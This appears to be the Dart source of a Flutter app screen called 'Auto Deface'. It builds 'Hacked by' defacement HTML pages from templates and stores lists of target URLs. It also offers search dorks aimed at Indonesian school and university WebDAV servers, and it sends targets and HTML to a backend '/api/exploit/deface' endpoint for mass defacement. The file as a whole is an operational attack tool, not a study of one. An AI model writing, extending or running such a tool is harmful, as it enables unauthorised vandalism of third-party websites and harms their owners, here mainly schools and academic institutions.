import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'srv.dart';

const Color kVoid = Color(0xFF060A0F);
const Color kInk = Color(0xFF090D14);
const Color kMatte = Color(0xFF0D1219);
const Color kPlate = Color(0xFF121820);
const Color kRim = Color(0xFF1A2332);
const Color kRimHi = Color(0xFF253347);
const Color kSnow = Color(0xFFF1F5F9);
const Color kAsh = Color(0xFF7A8FA6);
const Color kSlate = Color(0xFF3D5066);
const Color kElectric = Color(0xFF4F9CF9);
const Color kAmber = Color(0xFFFFB547);
const Color kRose = Color(0xFFFF6B8A);

const List<Color> kColorPalette = [
  Color(0xFF000000), Color(0xFF1A1A2E), Color(0xFF16213E), Color(0xFF1B1B1B),
  Color(0xFF2D2D2D), Color(0xFF3D3D3D), Color(0xFF0F0F0F), Color(0xFF1C1C1C),
  Color(0xFF800000), Color(0xFF8B0000), Color(0xFF4A0000), Color(0xFF2E0000),
  Color(0xFF006400), Color(0xFF004D00), Color(0xFF003300), Color(0xFF0A3300),
  Color(0xFF1A1A2E), Color(0xFF2D1B69), Color(0xFF4A1942), Color(0xFF1B1464),
];

const List<String> kFontList = [
  'Courier New, monospace', 'Consolas, monospace', 'Arial, sans-serif',
  'Verdana, sans-serif', 'Impact, fantasy', 'Georgia, serif', 'Trebuchet MS, sans-serif',
];

const Map<String, Map<String, String>> kTemplates = {
  'Classic': {
    'bg': '#000000', 'text': '#FFFFFF', 'accent': '#888888', 'font': 'Courier New, monospace',
    'extra': '',
  },
  'Matrix': {
    'bg': '#000000', 'text': '#00FF41', 'accent': '#008F11', 'font': 'Consolas, monospace',
    'extra': 'body::before{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,255,65,0.03)0px,rgba(0,255,65,0.03)1px,transparent 1px,transparent 3px);pointer-events:none;}',
  },
  'Blood': {
    'bg': '#1A0000', 'text': '#FF4444', 'accent': '#8B0000', 'font': 'Arial, sans-serif',
    'extra': '',
  },
  'Minimal': {
    'bg': '#0D1117', 'text': '#F0F6FC', 'accent': '#58A6FF', 'font': 'Arial, sans-serif',
    'extra': '',
  },
};

class DefacePage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final String username;
  const DefacePage({super.key, required this.sessionKey, required this.userRole, required this.username});

  @override
  State<DefacePage> createState() => _DefacePageState();
}

class _DefacePageState extends State<DefacePage> with TickerProviderStateMixin {
  late TabController _tabC;

  // HTML builder fields
  final _hackerC = TextEditingController(text: 'Hacked by ');
  final _titleC = TextEditingController(text: 'You\'ve Been Hacked');
  final _msgC = TextEditingController(text: 'Your security is weak.\nThis is a wake-up call.');
  final _footerC = TextEditingController(text: 'TR4SVLOID - Security Research');
  String _logoBase64 = '';
  String _musicBase64 = '';
  String _logoFileName = '';
  String _musicFileName = '';
  Color _bgColor = const Color(0xFF000000);
  Color _textColor = const Color(0xFFFFFFFF);
  Color _accentColor = const Color(0xFF888888);
  int _fontIdx = 0;
  String _templateKey = 'Classic';
  String _generatedHtml = '';
  WebViewController? _wvC;

  // Exploit fields
  final _targetC = TextEditingController();
  final _massC = TextEditingController();
  final _htmlManualC = TextEditingController();
  List<String> _savedTargets = [];
  String _exploitMethod = 'auto';
  bool _executing = false;
  List<Map<String, dynamic>> _exploitLogs = [];
  bool _useGeneratedHtml = true;
  int _successCount = 0;
  int _failCount = 0;

  @override
  void initState() {
    super.initState();
    _tabC = TabController(length: 2, vsync: this);
    _loadTargets();
    _generateHtml();
  }

  @override
  void dispose() {
    _tabC.dispose();
    _hackerC.dispose();
    _titleC.dispose();
    _msgC.dispose();
    _footerC.dispose();
    _targetC.dispose();
    _massC.dispose();
    _htmlManualC.dispose();
    super.dispose();
  }

  Future<void> _loadTargets() async {
    final p = await SharedPreferences.getInstance();
    setState(() => _savedTargets = p.getStringList('deface_targets') ?? []);
  }

  Future<void> _saveTargets() async {
    final p = await SharedPreferences.getInstance();
    await p.setStringList('deface_targets', _savedTargets);
  }

  String _colorToHex(Color c) =>
      '#' + c.value.toRadixString(16).substring(2).toUpperCase();

  String _generateHtml() {
    final tpl = kTemplates[_templateKey]!;
    final bg = _templateKey == 'Classic' || _templateKey == 'Matrix' || _templateKey == 'Blood' || _templateKey == 'Minimal'
        ? tpl['bg']!
        : _colorToHex(_bgColor);
    final txt = _templateKey == 'Classic' || _templateKey == 'Matrix' || _templateKey == 'Blood' || _templateKey == 'Minimal'
        ? tpl['text']!
        : _colorToHex(_textColor);
    final acc = _templateKey == 'Classic' || _templateKey == 'Matrix' || _templateKey == 'Blood' || _templateKey == 'Minimal'
        ? tpl['accent']!
        : _colorToHex(_accentColor);
    final font = _templateKey == 'Classic' || _templateKey == 'Matrix' || _templateKey == 'Blood' || _templateKey == 'Minimal'
        ? tpl['font']!
        : kFontList[_fontIdx];
    final extra = tpl['extra']!;

    final logoHtml = _logoBase64.isNotEmpty
        ? '<div class="logo"><img src="$_logoBase64" alt="logo" style="max-width:200px;max-height:150px;"></div>'
        : '';
    final musicHtml = _musicBase64.isNotEmpty
        ? '<audio autoplay loop><source src="$_musicBase64" type="audio/mpeg"></audio>'
        : '';
    final msgHtml = _msgC.text.replaceAll('\n', '<br>');

    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">$musicHtml<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:$bg;color:$txt;font-family:$font;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px;}
$extra
.container{max-width:700px;width:100%;padding:40px 30px;border:2px solid $acc;border-radius:10px;background:rgba(0,0,0,0.4);box-shadow:0 0 30px rgba(0,0,0,0.5);}
.logo{margin-bottom:20px;}
h1{font-size:2.2em;color:$acc;margin-bottom:10px;letter-spacing:2px;text-transform:uppercase;}
.title{font-size:1.4em;color:$txt;margin-bottom:25px;font-weight:bold;}
.msg{font-size:1em;line-height:1.6;margin-bottom:30px;opacity:0.9;}
.footer{margin-top:30px;padding-top:20px;border-top:1px solid $acc;font-size:0.85em;opacity:0.6;}
.sig{font-size:1.1em;color:$acc;margin-bottom:20px;font-weight:bold;}
</style></head><body>
<div class="container">
$logoHtml
<h1>${_titleC.text}</h1>
<div class="sig">${_hackerC.text}</div>
<div class="msg">$msgHtml</div>
<div class="footer">${_footerC.text}</div>
</div>
</body></html>''';
  }

  void _refreshPreview() {
    setState(() => _generatedHtml = _generateHtml());
    _wvC?.loadHtmlString(_generatedHtml);
  }

  Future<void> _pickLogo() async {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Pilih logo dinonaktifkan di build ini.')),
    );
  }

  Future<void> _pickMusic() async {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Pilih musik dinonaktifkan (file_picker tidak tersedia di build).')),
    );
  }

  void _applyTemplate(String key) {
    setState(() { _templateKey = key; });
    _refreshPreview();
  }

  Future<void> _copyHtml() async {
    await Clipboard.setData(ClipboardData(text: _generatedHtml));
    if (mounted) _showToast('HTML copied to clipboard');
  }

  Future<void> _downloadHtml() async {
    try {
      final f = File('${Directory.systemTemp.path}/deface_${DateTime.now().millisecondsSinceEpoch}.html');
      await f.writeAsString(_generatedHtml);
      if (mounted) _showToast('Saved: ${f.path}');
    } catch (e) {
      // Fallback: copy to clipboard
      await Clipboard.setData(ClipboardData(text: _generatedHtml));
      if (mounted) _showToast('HTML copied (save file failed)');
    }
  }

  void _addTarget() {
    final t = _targetC.text.trim();
    if (t.isEmpty) return;
    setState(() { _savedTargets.add(t); _targetC.clear(); });
    _saveTargets();
  }

  void _addMassTargets() {
    final lines = _massC.text.trim().split('\n').map((e) => e.trim()).where((e) => e.isNotEmpty).toList();
    if (lines.isEmpty) return;
    setState(() { _savedTargets.addAll(lines); _massC.clear(); });
    _saveTargets();
  }

  void _removeTarget(int i) {
    setState(() => _savedTargets.removeAt(i));
    _saveTargets();
  }

  Future<void> _testTarget(String url) async {
    try {
      final res = await http.get(Uri.parse(url)).timeout(const Duration(seconds: 10));
      if (mounted) _showToast('$url - HTTP ${res.statusCode}');
    } catch (e) {
      if (mounted) _showToast('$url - Unreachable');
    }
  }

  Future<void> _executeExploit() async {
    final html = _useGeneratedHtml ? _generatedHtml : _htmlManualC.text.trim();
    if (html.isEmpty) { _showToast('HTML content is required'); return; }
    if (_savedTargets.isEmpty) { _showToast('Add at least one target'); return; }
    setState(() { _executing = true; _exploitLogs = []; _successCount = 0; _failCount = 0; });

    try {
      final res = await http.post(
        Uri.parse('${Srv.baseUrl}/api/exploit/deface'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'targets': _savedTargets,
          'htmlContent': html,
          'method': _exploitMethod,
          'key': widget.sessionKey,
        }),
      );
      final data = jsonDecode(res.body);
      if (data['valid'] == true) {
        final results = data['results'] as List? ?? [];
        setState(() {
          _exploitLogs = results.cast<Map<String, dynamic>>();
          _successCount = results.where((r) => r['success'] == true).length;
          _failCount = results.where((r) => r['success'] != true).length;
        });
      } else {
        _showToast(data['message'] ?? 'Exploit failed');
      }
    } catch (e) {
      _showToast('Error: $e');
    } finally {
      setState(() => _executing = false);
    }
  }

  void _showToast(String msg) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg, style: const TextStyle(fontFamily: 'Rajdhani')),
      backgroundColor: kPlate,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kInk,
      appBar: AppBar(
        backgroundColor: kMatte,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_rounded, color: kSnow),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text('Auto Deface', style: TextStyle(color: kSnow, fontFamily: 'Rajdhani', fontWeight: FontWeight.w800, letterSpacing: 1)),
        bottom: TabBar(
          controller: _tabC,
          indicatorColor: kElectric,
          labelColor: kSnow,
          unselectedLabelColor: kSlate,
          labelStyle: const TextStyle(fontFamily: 'Rajdhani', fontWeight: FontWeight.w700, fontSize: 13),
          tabs: const [
            Tab(icon: Icon(Icons.code_rounded, size: 18), text: 'BUILDER'),
            Tab(icon: Icon(Icons.flash_on_rounded, size: 18), text: 'EXPLOIT'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabC,
        children: [_buildBuilderTab(), _buildExploitTab()],
      ),
    );
  }

  // ─────────────────────── BUILDER TAB ───────────────────────
  Widget _buildBuilderTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _section('TEMPLATE', [
            Wrap(
              spacing: 8,
              runSpacing: 6,
              children: kTemplates.keys.map((key) {
                final active = _templateKey == key;
                return GestureDetector(
                  onTap: () => _applyTemplate(key),
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(10),
                      color: active ? kElectric.withValues(alpha: 0.2) : kPlate,
                      border: Border.all(color: active ? kElectric : kRim, width: active ? 1.5 : 1),
                    ),
                    child: Text(key.toUpperCase(), style: TextStyle(
                      color: active ? kElectric : kAsh, fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w800,
                    )),
                  ),
                );
              }).toList(),
            ),
          ]),
          const SizedBox(height: 12),
          _section('CONTENT', [
            _field('Hacker / Team Name', _hackerC, icon: Icons.person_rounded, onChanged: (_) => _refreshPreview()),
            const SizedBox(height: 10),
            _field('Title', _titleC, icon: Icons.title_rounded, onChanged: (_) => _refreshPreview()),
            const SizedBox(height: 10),
            _field('Message', _msgC, icon: Icons.message_rounded, maxLines: 3, onChanged: (_) => _refreshPreview()),
            const SizedBox(height: 10),
            _field('Footer', _footerC, icon: Icons.horizontal_rule_rounded, onChanged: (_) => _refreshPreview()),
          ]),
          const SizedBox(height: 12),
          _section('MEDIA', [
            Row(
              children: [
                Expanded(child: _btn('Logo', Icons.image_rounded, _pickLogo)),
                const SizedBox(width: 10),
                Expanded(child: _btn('Music', Icons.music_note_rounded, _pickMusic)),
              ],
            ),
            if (_logoFileName.isNotEmpty) Padding(
              padding: const EdgeInsets.only(top: 6),
              child: Text('Logo: $_logoFileName', style: const TextStyle(color: kAsh, fontSize: 11, fontFamily: 'Rajdhani')),
            ),
            if (_musicFileName.isNotEmpty) Padding(
              padding: const EdgeInsets.only(top: 2),
              child: Text('Music: $_musicFileName', style: const TextStyle(color: kAsh, fontSize: 11, fontFamily: 'Rajdhani')),
            ),
          ]),
          const SizedBox(height: 12),
          _section('COLORS', [
            const Text('Background', style: TextStyle(color: kSlate, fontSize: 11, fontFamily: 'Rajdhani', letterSpacing: 1)),
            const SizedBox(height: 4),
            _colorGrid(_bgColor, (c) { setState(() => _bgColor = c); _refreshPreview(); }),
            const SizedBox(height: 10),
            const Text('Text', style: TextStyle(color: kSlate, fontSize: 11, fontFamily: 'Rajdhani', letterSpacing: 1)),
            const SizedBox(height: 4),
            _colorGrid(_textColor, (c) { setState(() => _textColor = c); _refreshPreview(); }),
            const SizedBox(height: 10),
            const Text('Accent', style: TextStyle(color: kSlate, fontSize: 11, fontFamily: 'Rajdhani', letterSpacing: 1)),
            const SizedBox(height: 4),
            _colorGrid(_accentColor, (c) { setState(() => _accentColor = c); _refreshPreview(); }),
          ]),
          const SizedBox(height: 12),
          _section('FONT', [
            DropdownButtonHideUnderline(
              child: DropdownButton<int>(
                value: _fontIdx,
                dropdownColor: kMatte,
                isExpanded: true,
                style: const TextStyle(color: kSnow, fontFamily: 'Rajdhani', fontSize: 13),
                items: kFontList.asMap().entries.map((e) => DropdownMenuItem(
                  value: e.key,
                  child: Text(e.value.split(',')[0].trim(), style: TextStyle(fontFamily: 'Rajdhani', color: kSnow)),
                )).toList(),
                onChanged: (v) { if (v != null) { setState(() => _fontIdx = v); _refreshPreview(); }},
              ),
            ),
          ]),
          const SizedBox(height: 12),
          _section('ACTIONS', [
            Row(children: [
              Expanded(child: _btn('Copy HTML', Icons.copy_rounded, _copyHtml)),
              const SizedBox(width: 10),
              Expanded(child: _btn('Download', Icons.download_rounded, _downloadHtml)),
            ]),
          ]),
          const SizedBox(height: 12),
          _section('PREVIEW', [
            SizedBox(
              height: 300,
              child: _generatedHtml.isEmpty
                  ? const Center(child: Text('Generate HTML first', style: TextStyle(color: kSlate)))
                  : _buildWebView(),
            ),
          ]),
          const SizedBox(height: 30),
        ],
      ),
    );
  }

  Widget _buildWebView() {
    if (_generatedHtml.isEmpty) return const SizedBox();
    return ClipRRect(
      borderRadius: BorderRadius.circular(12),
      child: WebViewWidget(
        controller: (_wvC ??= WebViewController()
          ..setJavaScriptMode(JavaScriptMode.unrestricted)
          ..loadHtmlString(_generatedHtml)),
      ),
    );
  }

  // ─────────────────────── EXPLOIT TAB ───────────────────────
  Widget _buildExploitTab() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _section('TARGETS', [
            Row(
              children: [
                Expanded(
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(10), color: kPlate,
                      border: Border.all(color: kRim),
                    ),
                    child: TextField(
                      controller: _targetC,
                      style: const TextStyle(color: kSnow, fontSize: 13, fontFamily: 'Rajdhani'),
                      decoration: const InputDecoration(
                        hintText: 'https://target.com', hintStyle: TextStyle(color: kSlate, fontSize: 12),
                        border: InputBorder.none,
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                _miniBtn(Icons.add_rounded, _addTarget, kElectric),
              ],
            ),
            const SizedBox(height: 10),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(10), color: kPlate,
                border: Border.all(color: kRim),
              ),
              child: TextField(
                controller: _massC,
                maxLines: 3,
                style: const TextStyle(color: kSnow, fontSize: 12, fontFamily: 'Rajdhani'),
                decoration: const InputDecoration(
                  hintText: 'Paste multiple targets (1 per line)', hintStyle: TextStyle(color: kSlate, fontSize: 11),
                  border: InputBorder.none,
                ),
              ),
            ),
            const SizedBox(height: 6),
            _btn('Add All', Icons.playlist_add_rounded, _addMassTargets),
            const SizedBox(height: 10),
            if (_savedTargets.isNotEmpty) ...[
              const Text('SAVED TARGETS', style: TextStyle(color: kSlate, fontSize: 10, fontFamily: 'Rajdhani', letterSpacing: 1.5)),
              const SizedBox(height: 6),
              ...List.generate(_savedTargets.length, (i) {
                final t = _savedTargets[i];
                return Container(
                  margin: const EdgeInsets.only(bottom: 4),
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8), color: kPlate,
                    border: Border.all(color: kRim),
                  ),
                  child: Row(
                    children: [
                      Icon(Icons.language_rounded, color: kAsh, size: 14),
                      const SizedBox(width: 8),
                      Expanded(child: Text(t, style: const TextStyle(color: kSnow, fontSize: 12, fontFamily: 'Rajdhani'), overflow: TextOverflow.ellipsis)),
                      GestureDetector(onTap: () => _testTarget(t), child: const Icon(Icons.wifi_find_rounded, color: kAsh, size: 16)),
                      const SizedBox(width: 8),
                      GestureDetector(onTap: () => _removeTarget(i), child: const Icon(Icons.close_rounded, color: kRose, size: 16)),
                    ],
                  ),
                );
              }),
            ],
          ]),
          const SizedBox(height: 12),
          _section('DORK', [
            Wrap(
              spacing: 6,
              runSpacing: 6,
              children: [
                _dorkChip('inurl:webdav site:sch.id'),
                _dorkChip('inurl:webdav site:ac.id'),
                _dorkChip('intitle:"Index of" webdav'),
                _dorkChip('inurl:/swm/ site:id'),
              ],
            ),
          ]),
          const SizedBox(height: 12),
          _section('METHOD', [
            DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                value: _exploitMethod,
                dropdownColor: kMatte,
                isExpanded: true,
                style: const TextStyle(color: kSnow, fontFamily: 'Rajdhani', fontSize: 13),
                items: [
                  'auto', 'webdav', 'cms', 'mass',
                ].map((m) => DropdownMenuItem(
                  value: m,
                  child: Row(children: [
                    Icon(_methodIcon(m), color: kElectric, size: 16),
                    const SizedBox(width: 8),
                    Text(m.toUpperCase(), style: const TextStyle(color: kSnow, fontFamily: 'Rajdhani')),
                  ]),
                )).toList(),
                onChanged: (v) { if (v != null) setState(() => _exploitMethod = v); },
              ),
            ),
          ]),
          const SizedBox(height: 12),
          _section('HTML SOURCE', [
            Row(children: [
              const Text('Use generated HTML', style: TextStyle(color: kAsh, fontSize: 12, fontFamily: 'Rajdhani')),
              const Spacer(),
              Switch(
                value: _useGeneratedHtml,
                onChanged: (v) => setState(() => _useGeneratedHtml = v),
                activeColor: kElectric,
              ),
            ]),
            if (!_useGeneratedHtml) ...[
              const SizedBox(height: 6),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12),
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(10), color: kPlate,
                  border: Border.all(color: kRim),
                ),
                child: TextField(
                  controller: _htmlManualC,
                  maxLines: 6,
                  style: const TextStyle(color: kSnow, fontSize: 11, fontFamily: 'Rajdhani'),
                  decoration: const InputDecoration(
                    hintText: 'Paste custom HTML here', hintStyle: TextStyle(color: kSlate, fontSize: 11),
                    border: InputBorder.none,
                  ),
                ),
              ),
            ],
          ]),
          const SizedBox(height: 16),
          GestureDetector(
            onTap: _executing ? null : _executeExploit,
            child: Container(
              height: 54,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(14),
                gradient: const LinearGradient(colors: [Color(0xFF8B0000), Color(0xFFCC0000)]),
                boxShadow: [BoxShadow(color: Colors.red.withValues(alpha: 0.3), blurRadius: 12)],
              ),
              child: Center(
                child: _executing
                    ? const SizedBox(width: 22, height: 22, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                    : const Text('EXECUTE', style: TextStyle(color: Colors.white, fontFamily: 'Rajdhani', fontSize: 16, fontWeight: FontWeight.w900, letterSpacing: 3)),
              ),
            ),
          ),
          if (_exploitLogs.isNotEmpty) ...[
            const SizedBox(height: 16),
            _section('RESULTS', [
              Row(children: [
                Text('$_successCount SUCCESS', style: const TextStyle(color: Color(0xFF22E07A), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w800)),
                const SizedBox(width: 16),
                Text('$_failCount FAILED', style: const TextStyle(color: kRose, fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w800)),
              ]),
              const SizedBox(height: 8),
              ..._exploitLogs.map((r) {
                final succ = r['success'] == true;
                final url = r['urlResult'] as String? ?? r['target'] as String? ?? '';
                return Container(
                  margin: const EdgeInsets.only(bottom: 4),
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    color: succ ? const Color(0xFF002200) : const Color(0xFF220000),
                    border: Border.all(color: succ ? const Color(0xFF00AA00).withValues(alpha: 0.3) : const Color(0xFFAA0000).withValues(alpha: 0.3)),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(children: [
                        Icon(succ ? Icons.check_circle_rounded : Icons.cancel_rounded, color: succ ? const Color(0xFF22E07A) : kRose, size: 16),
                        const SizedBox(width: 6),
                        Expanded(child: Text(url, style: const TextStyle(color: kSnow, fontSize: 11, fontFamily: 'Rajdhani'), overflow: TextOverflow.ellipsis)),
                      ]),
                      if (r['logs'] != null) ...[
                        const SizedBox(height: 4),
                        ...((r['logs'] as List).map((l) => Padding(
                          padding: const EdgeInsets.only(left: 22, top: 2),
                          child: Text(
                            '[${l['status']}] ${l['step']}',
                            style: TextStyle(color: l['success'] == true ? const Color(0xFF22E07A) : kAsh, fontSize: 10, fontFamily: 'Rajdhani'),
                          ),
                        ))),
                      ],
                    ],
                  ),
                );
              }),
            ]),
          ],
          const SizedBox(height: 30),
        ],
      ),
    );
  }

  IconData _methodIcon(String m) {
    switch (m) {
      case 'webdav': return Icons.cloud_upload_rounded;
      case 'cms': return Icons.dns_rounded;
      case 'mass': return Icons.grain_rounded;
      default: return Icons.auto_awesome_rounded;
    }
  }

  // ─────────────────────── WIDGETS ───────────────────────
  Widget _section(String title, List<Widget> children) {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(14),
        color: kMatte,
        border: Border.all(color: kRim),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(title, style: const TextStyle(color: kSlate, fontSize: 10, fontFamily: 'Rajdhani', letterSpacing: 2, fontWeight: FontWeight.w700)),
          const SizedBox(height: 10),
          ...children,
        ],
      ),
    );
  }

  Widget _field(String label, TextEditingController c, {IconData? icon, int maxLines = 1, void Function(String)? onChanged}) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(10), color: kPlate,
        border: Border.all(color: kRim),
      ),
      child: TextField(
        controller: c,
        maxLines: maxLines,
        onChanged: onChanged,
        style: const TextStyle(color: kSnow, fontSize: 13, fontFamily: 'Rajdhani'),
        decoration: InputDecoration(
          hintText: label, hintStyle: const TextStyle(color: kSlate, fontSize: 12),
          border: InputBorder.none,
          prefixIcon: icon != null ? Icon(icon, color: kAsh, size: 18) : null,
        ),
      ),
    );
  }

  Widget _colorGrid(Color selected, void Function(Color) onTap) {
    return Wrap(
      spacing: 6, runSpacing: 6,
      children: kColorPalette.map((c) {
        final active = c.value == selected.value;
        return GestureDetector(
          onTap: () => onTap(c),
          child: Container(
            width: 30, height: 30,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: c,
              border: Border.all(color: active ? kSnow : kRim, width: active ? 2 : 1),
              boxShadow: active ? [BoxShadow(color: kSnow.withValues(alpha: 0.2), blurRadius: 6)] : null,
            ),
          ),
        );
      }).toList(),
    );
  }

  Widget _btn(String label, IconData icon, VoidCallback onTap) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          color: kPlate,
          border: Border.all(color: kRim),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: kElectric, size: 16),
            const SizedBox(width: 6),
            Text(label, style: const TextStyle(color: kSnow, fontFamily: 'Rajdhani', fontSize: 12, fontWeight: FontWeight.w700)),
          ],
        ),
      ),
    );
  }

  Widget _miniBtn(IconData icon, VoidCallback onTap, Color color) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(10),
          color: color.withValues(alpha: 0.1),
          border: Border.all(color: color.withValues(alpha: 0.3)),
        ),
        child: Icon(icon, color: color, size: 18),
      ),
    );
  }

  Widget _dorkChip(String dork) {
    return GestureDetector(
      onTap: () => Clipboard.setData(ClipboardData(text: dork)),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(8),
          color: kPlate,
          border: Border.all(color: kRim),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(dork, style: const TextStyle(color: kAsh, fontSize: 10, fontFamily: 'Rajdhani')),
            const SizedBox(width: 4),
            const Icon(Icons.copy_rounded, color: kSlate, size: 12),
          ],
        ),
      ),
    );
  }
}
